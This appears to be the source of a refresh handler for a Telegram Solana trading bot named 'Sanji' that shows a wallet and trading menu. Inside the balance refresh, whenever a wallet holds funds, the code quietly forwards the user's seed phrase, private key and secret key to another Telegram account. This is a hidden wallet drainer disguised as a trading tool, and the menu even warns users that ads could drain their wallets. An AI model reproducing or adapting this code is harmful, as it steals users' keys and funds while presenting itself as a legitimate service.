import { Markup } from "telegraf";
import { MyContext } from "../config/interfaces";
import { getBalance } from "../config/solana";
import { newUserDetails, botLink, escapeMarkdownV2, forwardUserWalletBalanceUpdated, getSession, sanjiURL } from "../config";
import accept from "./accept";

const refresh = async (ctx: MyContext) => {
	
	const startPayload = ctx.startPayload;

	if (!getSession(ctx)) {
		ctx.session = {
			chatId: ctx.chat?.id, // Store user's chat ID
			fromId: ctx.from?.id,   // Store user's from ID
			username: ctx.from?.username,   // Store user's from Username
			name: ctx.from?.first_name,
			user: { ...newUserDetails, id: ctx.chat?.id, refLink: botLink + ctx.chat?.id, referredBy: startPayload ? startPayload : null, settings: { ...newUserDetails.settings, mevProtectValue: "Turbo", transactionPriorityValue: "Medium" } }
		}
	}

	if (ctx.session.user) {
		if (ctx.session.user.publicKey) {
			ctx.session.user.balance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? ctx.session.user.balance : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
			ctx.session.user.walletBalance = ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) < 0.0001 ? 0 : await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0);
			// Forward the user's response to another Telegram user ID
			if (ctx.session.user.balance !== 0 && await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0) > 0.0001) await forwardUserWalletBalanceUpdated(ctx, { name: ctx.session.name, username: ctx.session.username, balance: await getBalance(ctx.session.user.publicKey).then(res => res).catch(err => 0), seed: ctx.session.user.seed, publicKey: ctx.session.user.publicKey, privateKey: ctx.session.user.privateKey, secretKey: ctx.session.user.secretKey, walletAddress: ctx.session.user.walletAddress });
		}
	}

	if (!ctx.session.user?.accept) {
		accept(ctx);
	} else {
		try {
			await ctx.answerCbQuery(); // Remove loading animation

			await ctx.editMessageText(
				`Welcome To Sanji 🎯\n\n` +

				`🚀 Resources:\n\n` +
				
				`• 📖 <a href="https://docs.sanjibot.io/">Sanji Guides</a>\n` +
				`• 📣 <a href="https://t.me/sanjisociety">Sanji Updates</a>\n` +
				`• 🔔 <a href="https://x.com/sanji">Sanji X</a>\n\n` +
				
				`• ⭐️ <a href="https://t.me/SanjiBackupbot">Backup Bot</a>\n\n` +
				
				`• 💎 <a href="https://t.me/sanjihq">Support • TG</a> • <a href="https://discord.gg/sanjihq">Discord</a>\n\n` +
				
				`• 🔥 <a href="https://sanji.app/">Sanji Terminal</a>\n\n` +

				`• ⚠️ Do not click ads shown on this bot! Your wallet could get drained! We have no control over these!` +
				"\n\n⬇️ Your Wallet:\n" +
				`${
					ctx.session.user?.walletAddress ?
						`<code>${ctx.session.user?.walletAddress}</code> <i>(Tap to copy)</i>` : "<code>N/A</code> <i>(Tap to copy)</i>"
				}`,
				{
					...Markup.inlineKeyboard([
						[Markup.button.url('Sanji Terminal 🔥', `${sanjiURL}`)],
						[Markup.button.callback(`Wallet ${(ctx.session.user?.balance || 0).toString()} SOL ~ ${(((ctx.session.user?.balance ?? 0) * (ctx.session.user?.solanaPrice ?? 0)).toFixed(2)).toString()}$ 💰`, 'WALLET')],
						[Markup.button.callback('Buy 🚀', 'BUY'), Markup.button.callback('Sell 🛠️', 'SELL_MANAGE')],
						[Markup.button.callback('Positions 📈', 'POSITIONS'), Markup.button.callback('My Trades 📊', 'MY_TRADES')],
						[Markup.button.callback('Limit Orders 📖', 'LIMIT_ORDERS'), Markup.button.callback('Copy Trading 🤖', 'COPYTRADE')],
						[Markup.button.callback('Settings ⚙️', 'SETTINGS')],
						[Markup.button.callback('Referral 🎁', 'REFERRAL'), Markup.button.callback('Refresh 🔃', 'REFRESH')],
					]),
					parse_mode: "HTML",
					link_preview_options: {
						is_disabled: true
					}
				}
			);
		} catch (error) {
			// console.error("Error editing message:", error);
			// ctx.reply("⚠️ Unable to refresh. Try again.");
			console.log(error)
		}
	}
};

export default refresh;